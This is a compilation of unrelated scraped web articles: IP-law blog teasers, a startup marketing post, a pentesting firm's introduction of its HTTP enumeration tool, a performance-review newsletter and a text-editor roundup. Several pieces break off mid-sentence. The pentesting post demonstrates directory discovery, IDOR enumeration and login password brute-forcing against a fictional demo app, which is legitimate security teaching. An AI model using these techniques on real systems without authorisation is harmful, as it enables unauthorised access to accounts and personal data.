OFF-BRAND&nbsp; How a high-fashion brand and an ice cream shop have come to blows over intellectual property In the various industries that are out there, not too many are as different as fashion and ice cream. One is involved in providing happiness, comfort and everything nice in this world and that other provides a sharp reminder that maybe that extra scoop of ice cream was too much. But suffice to say, a rift between the two industries is not something that you would expect to find.&nbsp; But as hype culture and the obsessive fandom on the internet have grown, the industries have been growing closer and closer together. But sadly, not in the way you think, we are still a few years off wearable ice cream. Instead, there is now a good chance that your local ice creamery sells merchandise. Less impressive, for sure. But this has become a staple for restaurants with even just a modicum of goodwill attached to their name and why not? If customers are willing to pay an extra $50 so that people will

&nbsp; Green Eggs and Hamm How a crotch shot of John Hamm and Dr Seuss have sparked the most intense debate on fair use dealing in copyright in the last ten years.&nbsp; In 2013, John Hamm was in full swing, sipping cocktails and filming the wildly successful&nbsp; Mad Men&nbsp; however in years to come he may be remembered for something much more different. One uneventful day, John Hamm was photographed going commando and, thus changed how we see intellectual property rights on the internet forever.&nbsp; Like all paparazzi photos, it was promptly uploaded to the internet and licenced for use.  Unbeknownst to the photographer, the image was then used in an article by the Huffington Post, titled "25 Things You Wish You Hadn't Learned In 2013 And Must Forget In 2014." The writer of the piece turned the photo into a humourous GIF with the intention of mocking people who would want to see the picture and satirising the idea that it was news at all.&nbsp; The photographer later registered the photo's

A recent case in the United States District Court of Massachusetts has seen a woman whose house was used as a film set for adult videos without her knowledge be awarded damages… but not for what you think. In&nbsp; Bassett v Jensen,&nbsp; Ms Bassett, the owner of the property, signed an agreement with a renter to lease her Martha's Vineyard property for seven months for the sole use of Mr Spafford and his family. Spafford had moved to Martha's Vineyard to work as a photographer and cameraman for an adult film director.  Throughout the lease, Ms Bassett claims that 21 different videos were filmed at her property. Following the end of the Lease, Ms Bassett had to stop renting out the property as there was significant damage caused to the building and later due to the publicity that the property was used in filming the videos. Ms Bassett then argued that not only did the video showcase her property but they had infringed her copyright on numerous of her self-made artworks which were hanging

December 2, 2020 | https://blog.spreadtheworld.net/posts/my-first-post-hit-hackernews-homepage/ | <a href="https://web.archive.org/web/*/https://blog.spreadtheworld.net/posts/my-first-post-hit-hackernews-homepage/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Two weeks ago I created a brand new blog for <a href="https://spreadtheworld.net/">SpreadTheWorld</a>. I wanted to start some SEO efforts that will generate traffic to my product. I know SEO is a long term game, I thought that maybe I can leverage the content through distribution.</p><h2 id="the-content">The Content</h2><p>To kickstart my blog I wanted some good content that provides value to the readers. I don’t bother much about keywords, for now, I just wanted something valuable that will help both SEO&nbsp;&amp;&nbsp;marketing.
My first post was about one of my favorite topics:&nbsp;How to use Reddit as an IndieHacker.
I wrote a long post (750 words) about my experience and how you should use Reddit at each stage of your start-up. Then I cleaned it up with Grammarly and Hemmingway - to remove mistakes and improve readability.</p><p>My goals with that blog post were (in that order):</p><ul><li>Grow my Twitter audience</li><li>Create some traffic to my product</li><li>Grow my audience in different communities.</li></ul><p>I created some call to action for this. I added a CTA at the end of the post redirecting to my Twitter:&nbsp;
“Do you want to launch on Reddit? DM me on Twitter, I’ll be happy to help → Twitter”
The footer of each blog post was designed with a CTA to bring traffic to my product.</p><h2 id="distribution">Distribution</h2><p>I posted the article on the blog. It generates no traffic at all, no surprise, it’s the very first post.</p><p>Then I posted to IndieHackers, on a Saturday. Not the best day to share content, I got only 12 upvotes and a few comments. I also tried Reddit (on a weekday) and got small traction on /r/Entrepreneur:&nbsp;56 upvotes and 25 comments. Nothing extraordinary for a community with 900k members…</p><p>As I’m trying to start using HackerNews I also posted the link of my post to HN with the title:&nbsp;”How to Use Reddit as an IndieHacker”. It got no upvotes, I just watched the post drawing in the “New” section and disappear :/</p><p>I thought: “ok, my post wasn’t that good, I’ll write a new one and try again”.</p><h2 id="retry">Retry!</h2><p>A few days later, I read a tweet from someone explaining that you should re-post your content on HN. That can make some results and the community is ok with that.</p><p>So I&nbsp;tried. I just made a small modification in the title: instead of</p><blockquote><p>“How to Use Reddit as an IndieHacker”</p></blockquote><p>I&nbsp;did</p><blockquote><p>“How to use Reddit to get your first users”</p></blockquote><p>I know that getting the first users is a real pain (that’s why I created SpreadTheWorld), so I&nbsp;figured that, maybe, it will catch more attention.</p><p>I checked an hour later and the post got a massive spike on my analytics tool!&nbsp;
<img src="https://www.dropbox.com/s/vbbofk1ga2ir3pi/newsycombinator%20visits%20spike.jpg?raw=1" alt="hackernews spike analytics">
The post just exploded! At this time I&nbsp;got 36 upvotes and was #5 on the homepage!</p><h2 id="homepage-of-hacker-news">Homepage of Hacker News</h2><p>That day was crazy! My blog post stayed on the homepage for almost 8hrs, brought me, 6000 visitors - sometimes more than 100 concurrent users!
I also got 100+&nbsp;comments on the HN post, I spent the day answering them and trying to keep the momentum going!
I also monitored Twitter to thank every shout-out and try to create some momentum there as well.
Here is the <a href="https://twitter.com/AngeZanetti/status/1331264065264562177">live Tweet</a></p><h3 id="final-stats">Final Stats</h3><p>A week after the post, here are the stats:</p><ul><li>7.2k visits on my blog</li><li>25 new followers on Twitter</li><li>350 visitors on SpreadTheWorld homepage</li><li>A few sales only (during the first 8hrs), a few more afterward</li></ul><h3 id="the-conversion-wasn-t-good">The conversion wasn’t good!</h3><p>I told you earlier that I&nbsp;had some CTA&nbsp;on the blog +&nbsp;on the bottom of my post to convert the audience.
They didn’t work! A&nbsp;very few people clicked on them, the bottom of my post was too muddled and the text was too vague:</p><p><img src="https://www.dropbox.com/s/oh6x3yvwlohoujq/bad-cta-blogspreadtheworld.jpg?raw=1" alt="muddled footer cta"></p><p>I updated it to:</p><p><img src="https://www.dropbox.com/s/2aa3zv0yt54epi2/improved-cta-blogspreadtheworld.jpg?raw=1" alt="improved footer cta"></p><p>And it worked!&nbsp;The conversion rate jumped from 0,6% to 2,3%:
And I also added a CTA&nbsp;in the header (the day after) - a lot of visitors wasn’t going to the end of the post:</p><p><img src="https://www.dropbox.com/s/dg9tqwyr47y3vdc/clean%20header.png?raw=1" alt="cleaned header with CTA"></p><p>The conversion is now way higher, almost 10%&nbsp;of the blog visitors go on the product page!</p><p>I did all these experiments during the rush, so I kind of miss this wave of visitors, but I’m ready for the next one!</p><h2 id="takeaways">Takeaways</h2><ol><li><p>Distribution is super important, more than anything else. Create a good product/content and post it to every (big) community. You never know if it’s going to work so just share it!</p></li><li><p>Retry, if it does not work on a platform try to submit it to another one. If it still doesn’t work update the content/title and re-post it!</p></li><li><p>CTA&nbsp;is crucial. Understand before posting what your goals are and monitor the conversion (I didn’t do it, I regret it…)</p></li><li><p>You need months to leverage good content!</p></li></ol><p>Do you need help to grow your audience or distribute your content?

December 2, 2020 | https://blog.redteam-pentesting.de/2020/introducing-monsoon/ | <a href="https://web.archive.org/web/*/https://blog.redteam-pentesting.de/2020/introducing-monsoon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <div>
    <h4>2 December 2020</h4>
    
    



    <p>We recently released our first open-source project,
<a href="https://github.com/RedTeamPentesting/monsoon">monsoon</a>. monsoon is a so-called
command-line <em>HTTP enumerator</em>: A tool that iterates over a list of values, for example
a word list or a range of integers, and sends one HTTP request per item towards a given
server. The target server, path and HTTP headers can be configured on the command line.
There, one can replace parts of the HTTP request with the placeholder <code>FUZZ</code>. All its
occurrences are replaced with the current item during each iteration. Optionally,
monsoon can filter or even parse the HTTP response.</p>
<p>monsoon can be very helpful during penetration testing and in this blog post we would
like to motivate its development and introduce some common scenarios that can be tackled
using monsoon.</p>
<h3 id="motivation">Motivation</h3>
<p>There are quite a few similar software projects on the internet, namely DirBuster,
<a href="https://github.com/OJ/gobuster">gobuster</a>, <a href="https://github.com/xmendez/wfuzz">wfuzz</a> or
<a href="https://github.com/ffuf/ffuf">ffuf</a>. We have used some of them during penetration tests
and while these might be great tools for certain jobs, we felt that none of them reflect
our penetration testing workflow very well.</p>
<p>Penetration tests at RedTeam Pentesting mostly consist of a manual, creative search for
vulnerabilities, since we, as well as our customers, feel that this is the most
efficient way to deliver high-quality results. However, this does not imply that we do
not use automated tools for highly repetitive tasks, such as port scanning or
brute-force attacks. In order to integrate corresponding software into our creative
workflow, tools have to be very versatile. The most versatile tool sets are made up of
multiple single-purpose, easy to use tools working on open/standardised data formats.
Great examples can be found in the basic Unix tool set: <code>cat</code>, <code>grep</code>, <code>cut</code>, <code>head</code>,
<code>tail</code>, … all of which act on simple text streams and strive to fulfill a single
purpose.</p>
<p>Thus, our goal when developing monsoon was to stay close to the minimally necessary
feature set for an HTTP enumerator and to add new features only if they are actually
relevant for our penetration testing workflow. The first commits to the monsoon
repository are from 2017; since then we have used and refined monsoon in many many
penetration tests.</p>
<p><strong>Note</strong>: The applications analysed in this blog post have been developed specifically
for the purpose of demonstrating monsoon. All names, addresses and other data are purely
fictional.
</p>

<h3 id="file-and-directory-discovery">File and Directory Discovery</h3>
<p>The most common usage scenario for monsoon is the discovery of files or folders which
are served by a web server, but are not directly linked from any previously known page.
This might for example include administration panels, different applications or remnants
of development, such as debugging endpoints or even source code. If these resources are
not protected by separate authentication, any attacker who knows the corresponding URL
can interact with them.</p>
<p>This is where monsoon comes in: monsoon allows us to query many URLs in sequence, with
the goal of guessing URLs to aforementioned hidden resources. In this process, our
success rate depends on the speed and quality of guesses. A good starting point for
guessing hidden file and directory names is the <a href="https://github.com/danielmiessler/SecLists">SecLists
project</a> by Daniel Miessler. SecLists is a
large collection of word lists for many different purposes. The files that we are
interested in during this attack phase are contained in the folder
<a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content"><code>Discovery/Web-Content</code></a>. Among others, the folder contains the RAFT word lists
originally compiled by FishNet Security, such as <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-small-files.txt"><code>raft-small-files.txt</code></a> and <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-small-directories.txt"><code>raft-small-directories.txt</code></a>.</p>
<p>The following screen cast shows an invocation of monsoon on a sample application with the
goal of discovering hidden subdirectories below the path <code>/app</code>:</p>


<asciinema-player author="RedTeam Pentesting GmbH" title="Screencast" theme="redteam" poster="npt:0:02" src="/2020/introducing-monsoon/demo_discovery.cast"></asciinema-player>


<p>The HTTP responses are summarised in the result table. With the command-line option
<code>--hide-status</code> set to 404, we have hidden 996 responses for which the web
server has responded with <code>404 Not Found</code>. We’re rather interested in the four results
for which the web server has responded with status code 302, indicating a redirection.
It’s a very common behavior of web servers to redirect requests from <code>/foo</code> to <code>/foo/</code>
if the directory <code>foo</code> exists. In this case there are several interesting directories,
such as <code>internal</code> and <code>phpMyAdmin</code> which we subsequently would inspect manually.</p>
<h3 id="enumeration">Enumeration</h3>
<p>Another common scenario is the exploitation of a so-called <a href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html">insecure direct object
reference
(IDOR)</a>
vulnerability. Such vulnerabilities exist whenever access to a resource only depends
on a predictable reference, such as a numerical ID, a known algorithm generating a
serial number or otherwise obtained UUIDs. Imagine a web application where data
for your user profile is fetched from the endpoint <code>/api.php?userid=11</code>:</p>
<div><pre><code data-lang="bash">$ curl -s <span>'http://app.example.com/api.php?userid=11'</span> | jq
<span>{</span>
  <span>"Id"</span>: 11,
  <span>"FirstName"</span>: <span>"RedTeam"</span>,
  <span>"LastName"</span>: <span>"Pentesting"</span>,
  <span>"UserName"</span>: <span>"rtpt"</span>,
  <span>"Email"</span>: <span>"jobs@redteam-pentesting.de"</span>
<span>}</span>
</code></pre></div><p>What happens if <code>/api.php?userid=10</code> is requested? In this example, we assume that
the analysed web application does not intend to offer the functionality to display
other users personal information and should therefore deny the access to it. Despite
the intention of the web application, user data is returned which indicates an IDOR
vulnerability:</p>
<div><pre><code data-lang="bash">$ curl -s <span>'http://app.example.com/api.php?userid=10'</span> | jq
<span>{</span>
  <span>"Id"</span>: 10,
  <span>"FirstName"</span>: <span>"Ben"</span>,
  <span>"LastName"</span>: <span>"Grimm"</span>,
  <span>"UserName"</span>: <span>"b.grimm"</span>,
  <span>"Email"</span>: <span>"b.grimm@example.com"</span>
<span>}</span>
</code></pre></div><p>We often use monsoon in this scenario in order to demonstrate the impact of such a
vulnerability to our customers. With the <code>-r</code>/<code>--range</code> option, monsoon iterates over
ascending integer numbers instead of a word list. This is demonstrated in the following
screen cast:</p>


<asciinema-player author="RedTeam Pentesting GmbH" title="Screencast" theme="redteam" poster="npt:0:04" src="/2020/introducing-monsoon/demo_enumerate_json.cast"></asciinema-player>


<p>That was fast! Note that the results appear out of order because monsoon by default
sends five concurrent requests. Furthermore, we have parsed the JSON response with the
command-line JSON parser <a href="https://stedolan.github.io/jq/">jq</a>. Its output (the fictional
person’s name) is displayed in the result table.</p>
<p>Additionally, monsoon can perform basic content extraction without an external process.
For this purpose, one can provide a regular expression to the <code>--extract</code> parameter.
monsoon will try to match the regular expression to the HTTP response body. If one or
more matches have been found, the content of the first capture group of each match will
be displayed in the results table. This can be useful if, for example, you want to extract
content from responses containing HTML. Imagine the following endpoint:</p>
<pre><code>$ curl -s 'http://app.example.com/dashboard.php?userid=11'
&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;meta charset="utf-8"&gt;
        &lt;title&gt;Profile of RedTeam Pentesting&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;Profile of RedTeam Pentesting&lt;/h1&gt;
        &lt;table&gt;
            &lt;tr&gt;&lt;th&gt;Key&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;First Name&lt;/td&gt;&lt;td&gt;RedTeam&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;Last Name&lt;/td&gt;&lt;td&gt;Pentesting&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td&gt;Email&lt;/td&gt;&lt;td&gt;jobs@redteam-pentesting.de&lt;/td&gt;&lt;/tr&gt;
        &lt;/table&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>Here, we can use the regular expression <code>&lt;title&gt;Profile of ([^&lt;]+)&lt;/title&gt;</code> to extract a
name from the title. Watch to see monsoon quickly extract names from our sample
application:</p>

<h3 id="brute-force">Brute-Force</h3>
<p>HTTP requests are not always as straight-forward as the ones shown before. You might
encounter requests which require certain HTTP headers or some complex body structure. In
those cases it might be easier to start from a known HTTP request, one that has for
example been captured with an HTTP attack proxy like <a href="https://www.zaproxy.org/">ZAP</a>.
One example could be the following login request to a our sample application:</p>
<div><pre><code data-lang="http"><span>POST</span> <span>/login.php</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>app.example.com</span>
<span>User-Agent</span><span>:</span> <span>Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span>Content-Type</span><span>:</span> <span>application/x-www-form-urlencoded</span>
<span>Accept</span><span>:</span> <span>*/*</span>
<span>Accept-Language</span><span>:</span> <span>en-US,en;q=0.5</span>
<span>Accept-Encoding</span><span>:</span> <span>gzip, deflate, br</span>
<span>Referer</span><span>:</span> <span>http://127.0.0.1:8080/</span>
<span>Connection</span><span>:</span> <span>keep-alive</span>
<span>Pragma</span><span>:</span> <span>no-cache</span>
<span>Cache-Control</span><span>:</span> <span>no-cache</span>

username=admin&amp;password=FUZZ
</code></pre></div><p>We save this request as a file with the name <code>login-request.txt</code>. As the request body
shows, we would like to authenticate with the username <code>admin</code>, but we don’t know the
password (yet). Therefore, we substitute the <code>password</code> parameter with the placeholder
<code>FUZZ</code>. Now, we can specify the file name <code>login-request.txt</code> as the value of the
<code>--template-file</code> parameter. For the URL we only have to specify the correct server, as
this cannot be deduced from the template file. Note that some fields such as the
<code>Content-Length</code> header will be automatically adjusted by monsoon.</p>
<p>Again, decent word lists to start from can be found in the SecLists project. This time,
we will use a word list from the <code>Passwords</code> directory. Most files in this directory
contain common passwords and default passwords. For this demonstration, we will use the
word list
<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords-10000.txt">xato-net-10-million-passwords-10000.txt</a>
which has been originally compiled by Mark Burnett (xato.net). The invocation with the
aforementioned template file is as follows:</p>


<asciinema-player author="RedTeam Pentesting GmbH" title="Screencast" theme="redteam" poster="npt:0:04" src="/2020/introducing-monsoon/demo_bruteforce.cast"></asciinema-player>


<p>Et voilá, we discovered that the password is <code>wonderful</code>! 😁</p>

<h3 id="conclusion">Conclusion</h3>
<p>monsoon is a very versatile HTTP enumerator suited for penetration testing of web
applications. Its limited feature set helps the project stay lean while allowing for
creative use. In the end, it’s a tool, developed to support your creative workflow.</p>

<![CDATA[The Most Wonderful Time of the Year: Review Season]]>
            </title>

December 2, 2020 | https://boringstartupstuff.com/newsletter/dec-1-2020-review-performance-reviews | <a href="https://web.archive.org/web/*/https://boringstartupstuff.com/newsletter/dec-1-2020-review-performance-reviews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>Everyone’s favorite time of year: performance review season!&nbsp;</span></p>
<p><span>Roles in a startup change quickly, so the performance review process must adapt as team structure, company focus, and overall process also change. </span><span>The differences between the two startups I've been at are stark. Here's a look at the process for each.</span></p>

<p><span><strong>Next Caller</strong></span></p>
<p><span>The process lasts a month and involves a set of 360-degree reviews.&nbsp; We start in mid-November and go as follows:</span></p>
<ul>
<li><span>Week 1: Self Review</span></li>
<li><span>Week 2: Peer Review (3-5 per employee) + Manager Review</span></li>
<li><span>Week 3: Direct Report Reviews (if any)</span></li>
<li><span>Week 4: 1:1 meetings with your manager to discuss performance and set next year’s goals</span></li>
</ul>

<p><span>Our reviews focus on major contributions from the past year and on how well the employee exemplifies the company values, plus an overall rating of general performance ranging from "below expectations" to "exemplary."&nbsp;</span><span>I set my team’s performance goals after discussing the upcoming year with the other team leaders. Departmental goals (usually between 4-5 clearly defined objectives) are then used as goalposts for outlining individual team member goals. I use the Week 4 1:1 to lay out individual team member goals, and together we define a measurement and feedback system to monitor throughout the upcoming year. Lastly, our Head of Operations keeps an archive of all reviews in a secure directory.</span></p>

<p><b>What works well:</b><span> The broad peer review process requires individuals to focus on the whole team and not simply within their direct reporting line. Additionally, by focusing on our companies values as guideposts, we don't pigeonhole performance to the bars set in our job descriptions. Instead, we can incorporate instances when the employee went outside the scope of their prescribed duties, as there are intangible values different team members bring to the table outside of their roles.&nbsp;</span></p>

<p><b>Challenges</b><span>: Our process is time-consuming, though not nearly as bad as the </span><a href="https://www.shrm.org/resourcesandtools/hr-topics/employee-relations/pages/performance-reviews-are-dead.aspx" rel="follow noopener" target="_blank"><span>210 hour average</span></a> <span>other managers supposedly spend on their process. Selecting peer reviewers for my direct reports was challenging, as I didn't want to overburden some individuals who work across group while also ensuring that everyone got a voice somewhere. However, peer reviews are great at surfacing working relationships that are otherwise less visible. Finally, there are the technical quirks and challenges that come with the SaaS platform we chose (sorry, PerformYard). I would stick to simpler technology in the future.</span></p>

<hr>

<p><strong>Kard</strong></p>
<p><span>When I ran a review process at Kard, the team was 5 employees, so the process was much simpler. Because of our size and lack of organizational structure, a more direct review process worked well.&nbsp;&nbsp;</span></p>

<p><span>Kard’s formal review process took place just after the turn of the year.&nbsp; I wrote reviews of my direct reports, and in turn, was also reviewed by our CEO (my direct manager). After sharing the review with the individuals on my team and submitting to the CEO, I set aside hour-long meetings with each report to discuss the highs and lows of previous year and the areas for improvement.&nbsp;</span><span>All in, the process took up only a few hours.</span></p>

<p><b>What works well:</b><span> Because the company was smaller, peer relationships were in the open, and the straightforward annual review process saved the team time. Team member roles were moving targets, so the reviews were much more focused on the value added to the company as a whole and less about individual goals.</span></p>

<p><b>Challenges</b><span>: Given Kard’s early stage and low structure, the review process was challenging because there were so much unknown about where we were headed.</span></p>

<hr>

<p><span>Regardless of your team’s current process, it is worthwhile to revisit the process and think through your goals for the coming year. Review processes come in all shapes, and what works for one company may not work for another.</span></p>

<p><span>Here are a few takeaways from the review processes I've participated in, ranging from Fortune 50 companies to 5-person startups:</span></p>

<ol>
<li>Eliminate practices, such as rankings, that pit employees against each other and create a non-collaborative work environment.</li>
<li>Remove numerical scoring as it creates a depersonalized evaluation of employees. It is just as easy to use word based scoring that provides a less depersonalized assessment of skill.</li>
<li>Focus on the major wins and contributions throughout the year. Instead of highlighting losses, pinpoint future areas of improvement.&nbsp;</li>
<li>Detach compensation discussions from the review process. This allows reviews to focus on what is really important -- job performance.</li>
<li>Make the yardstick clear and available before reviews begin. This can take several flavors: in Next Caller’s case, we have a copy of our company maxims hanging right on our office walls and clear team objectives set every year. For Kard, the objectives were less defined, but each individual shared the same common goal of company success.</li>
<li>Review your review process as your company grows. Change is inevitable. Don’t settle for “what we have always done” as the fallback process each year.</li>
</ol>

<p><span>This process looks different from startup to startup, but the end goal should be the same: celebrate wins, patch up leaks, and make your team better in the coming year.&nbsp;</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><a href="https://www.ego-cms.com/tags/tools"><p>Tools</p></a><h2>10 Best Text Editors for Web Developers</h2><p>In this post, we’re comparing free Atom, Brackets, Visual Studio Code, Notepad++++ and Vim text editors, as well as paid Sublime Text 3, BBEdit, Coda, NoteTab Pro, and Webstorm.</p></div></div><article><div target="_blank"><p>It is difficult for a developer to perform tasks without a high-quality text editor. It not only speeds up the process but also allows you to add a lot of functions that will simplify the work even with the most complex code.<br></p><p>There is a large number of text editors to choose from. Some of them are better, some are worse. We’ve put together a list of the best text editors for working with code, in our opinion, considering both paid and free services.<br></p><h2>Best Free Text Editors</h2><h3>Atom</h3><p>Atom is one of the most popular web development text editors. The program is open source, and the creators of the service are GitHub developers.</p><p>Atom has quite extensive functionality. In particular, the developers have provided the following features:</p><ul role="list"><li>Syntax highlighting;</li><li>Code completion;</li><li>Code collapse;</li><li>Support for dozens of languages.<br></li></ul><p>The creators have also provided support for GitHub. When you install Atom, the package manager is installed on your computer. Using the manager, the web developer has the <strong>ability to search for the GitHub package, or download their own</strong>, which will help to expand the service.<br></p><p>Atom supports the Teletype option (codeshare) so that multiple web developers can build the same project simultaneously. The Atom team also provided the option of extending the editor using the Atom IDE, which is a set of feature packages.</p><figure id="w-node-32f28ed3877d-7a0a8b78"><a href="https://atom.io/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d3979ce5b76f54003b7acec_EGO_atom.png" alt=""></p></a></figure><p>‍</p><h3>Brackets</h3><p>Adobe, known for its solutions for web developers and designers, has also released its own text editor for code called Brackets. Experts from MIT were involved in the development. Brackets is well suited for<strong> front-end developers</strong> who prefer to work with languages such as <strong>Javascript, HTML, or CSS</strong>.<br></p><p>Brackets combines a set of standard features (code completion, syntax highlighting, quick editing) and unique options created by Adobe developers. These include:</p><ul role="list"><li><strong>Live Preview</strong>. A feature that allows you to preview the code. With it, the developer is able to <strong>open the code in Chrome</strong> and check how it works in the browser.</li><li><strong>Extract. </strong>An option that allows you to <strong>transfer settings from a PSD file to a CSS file</strong>. In particular, the developer has the ability to load color, font, gradient, and other settings.&nbsp;<br></li></ul><p>In addition, Brackets offers front-end developers a good array of settings. Adobe provides adequate support to the programming text editor, regularly releasing a variety of packages. Add-ons are loaded through the <a href="https://registry.brackets.io/">Brackets registry</a>.</p><figure id="w-node-6bf0d8a3ca83-7a0a8b78"><a href="http://brackets.io/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d397b544b8a5665f3a29cc7_EGO_brackets.png" alt=""></p></a></figure><p>‍</p><p>‍</p><h3>Visual Studio Code</h3><p>Visual Studio Code is an official text editor for web development from Microsoft. According to Stack Overflow <a href="https://insights.stackoverflow.com/survey/2019#technology-most-popular-development-environments">statistics</a>, <strong>55.6% of specialists choose this program</strong>. The service is supported not only on Microsoft OS but also on Linux and Mac. Visual Studio Code has a fairly large set of tools for creating and debugging code.&nbsp;<br></p><p>Microsoft specialists have provided opportunities for integration with other services. The main advantage of the VS Code is <strong>Live Share</strong>. This creates the option of joint work between several experts on one code. This way, you don't have to pass code to multiple developers one at a time.<br></p><p>The VS Code functionality also offers <strong>auto-completion, GitHub integration, syntax highlighting</strong>, and many other useful features. In addition, there is a collection of add-ons that provide an additional set of options and allow you to customize the editor for everyone.</p><figure id="w-node-b9d85a41c7ad-7a0a8b78"><a href="https://code.visualstudio.com/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d397bb428d7f14f5baf14ef_EGO_vsc.png" alt=""></p></a></figure><p>‍</p><h3>Notepad++</h3><p>The Notepad++ code editor has become a classic for developers. The first version appeared in 2003 on Windows, and today it is available only for this platform. The program is time-tested and has won its large audience. According to Stack OverFlow <a href="https://insights.stackoverflow.com/survey/2019#technology-most-popular-development-environments">research</a>, <strong>30.4% of developers use this service</strong>.<br></p><p>A distinctive feature of Notepad++ is its speed. <strong>It's really very fast.</strong> It works well with various programming languages “right out of the box.” However, this editor is most often <strong>used for HTML</strong>.&nbsp;<br></p><p>Notepad++ supports editing in different tabs. In addition, it allows you to expand functionality using external extensions. For example, you can add syntax highlighting, macros, compiler integration, indentation, and more.</p><figure id="w-node-8fbccfd28517-7a0a8b78"><a href="https://notepad-plus-plus.org/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d397a315600c0d6cbe3be32_EGO_notepad.png" alt=""></p></a></figure><p>‍</p><h3>Vim</h3><p>Vim is considered one of the most powerful console coding text editors available today. It is preinstalled on almost any UNIX. An interesting feature of the service is the ability to <strong>fully control it by only using the keyboard</strong>. Although, if you prefer to work with a mouse, then of course you can use that too.<br></p><p>Vim is a text editor for developers who have quite a lot of experience. However, if you manage to master it, you will open up new opportunities. You can solve problems with Vim in just a few minutes that would take hours in other programs.<br></p><p>Immediately after installation, Vim is unlikely to surprise you with any features. It will perfectly cope with the text, but for more complex tasks it has to be configured. Fortunately, the program provides a large number of various add-ons, plugins, and options, so the functionality of Vim can become the most extensive among all the services on the market. Another important advantage is the fact that Vim <strong>uses only a part of the system memory </strong>and loads instantly.</p><figure id="w-node-22886dca66a3-7a0a8b78"><a href="https://www.vim.org/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d397a4648fa16274c339c5f_EGO_vim.png" alt=""></p></a></figure><p>‍</p><h2>Best Paid Text Editors</h2><h3>Sublime Text 3</h3><p>The first paid editor that deserves serious attention is Sublime Text 3. The program is available in both free and paid versions and is present in many top text editors ratings. Supported on Windows, Linux, and Mac platforms. This is a <strong>very fast editor that will not take up much disk space and system resources</strong>.<br></p><p>In the trial mode, you can use the program for an unlimited amount of time. If you need more functionality, you can buy the full version, which costs $80. The free program offers standard editor features such as code folding, auto-completion, syntax highlighting.&nbsp;<br></p><p>In paid mode, the updated version of Sublime 3.1 offers the user a lot of useful options, including:</p><ul role="list"><li>Rendering of text with the support of ligatures;</li><li>Wide range of color schemes;</li><li>Improved syntax definition.</li></ul><p>Sublime Text 3 functionality is enhanced with <a href="https://packagecontrol.io/">Package Control</a>. Here, the developer will find a lot of useful applications and add-ons. In particular, you can add <strong>debugging tools, additional themes, Intellisense support, </strong>and many other options.</p><figure id="w-node-058adb2dfb7b-7a0a8b78"><a href="https://www.sublimetext.com/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d397a604b8a56ca85a27871_EGO_sublime.png" alt=""></p></a></figure><p>‍</p><h3>BBEdit</h3><p>When choosing a paid text editor for Mac, you need to pay attention to BBEdit. This is a very good service for developers who work <strong>primarily with HTML</strong>. BBEdit stands out for its very user-friendly and thoughtful interface. The editor allows you to quickly find and replace regular expressions, and it has a project management function.<br></p><p>BBEdit also has the ability to navigate functions. Syntax highlighting is supported not only for HTML but also for many other languages. Among the features of the editor are:</p><ul role="list"><li>AppleScript, Perl, and Mac OS X Unix Support;</li><li>An extensive list of HTML tools;</li><li>"Open from FTP Server” and “Save to FTP Server” commands that use FTP Browser;</li><li>A set of functions that greatly simplify work with Unix-scripts for Perl, Python, and Shell scripting.<br></li></ul><p>Bare Bones company, the developer of BBEdit, offers users<strong> four versions of the program with different functionality, </strong>including premium<strong>,</strong> which costs between $30–$50. There is also a <strong>trial period of 30 days</strong>.</p><figure id="w-node-9a59913d4c22-7a0a8b78"><a href="https://www.barebones.com/products/bbedit/" target="_blank"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5d397a704b8a567ec4a27bee_EGO_bbe.png" alt=""></p></a></figure><p>‍</p><h3>Coda</h3><p>Panic Inc, known for its applications for developers, has created its own text editor named Coda. This service is best suited for professionals who develop MacOS and iOS apps, web apps as well as websites.<br></p><p>Coda offers users a <strong>trial version that is valid for 7 days</strong>. After that you will be offered the opportunity to purchase the program with full functionality, which costs $99. However, in the case of Coda, there is really something worth paying for as the project is being developed and changed every day. It is a powerful and popular text editor, and its creators made sure that the work done with the program was as convenient as possible.<br></p><p>Coda has an intuitive interface and a fairly wide range of basic functions, including:</p><ul role="list"><li>Code completion;</li><li>Syntax highlighting for a large number of languages;</li><li>Local indexing;</li><li>Ability to work with MySQL.<br></li></ul><p>Another interesting feature of Coda is the function of <strong>opening and managing local and remote documents</strong>. The developers have also provided a <strong>quick access option</strong>. The creators of the service and the community actively support the editor, regularly adding new plugins to the <a href="https://panic.com/coda/plugins.php">library</a>. Therefore, the functionality of Coda is easy to expand and adjust to perform your tasks.</p><figure id="w-node-2c260938579e-7a0a8b78"><a href="https://panic.com/coda/" target="_blank"><p><img 